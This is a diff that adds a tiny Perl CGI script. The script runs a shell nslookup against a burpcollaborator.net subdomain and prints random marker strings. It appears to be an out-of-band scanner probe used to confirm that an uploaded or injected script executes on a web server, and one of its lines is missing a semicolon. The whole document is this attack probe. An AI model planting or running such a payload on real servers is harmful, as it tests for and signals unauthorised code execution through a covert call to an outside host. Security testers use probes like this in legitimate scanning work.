@@ -1,0 +1,6 @@
+#!/usr/bin/env perl
+print "Content-type: text/html\n\n"
+`nslookup NN.ptmd25mzys6v96grp8o1qxunieo9kx9.burpcollaborator.net`;
+local ($k);
+$k = "qbtMvisRAdzJDUaTuKgn";
+print $k . "vyOpsnFcCuJNmldDjtEH";
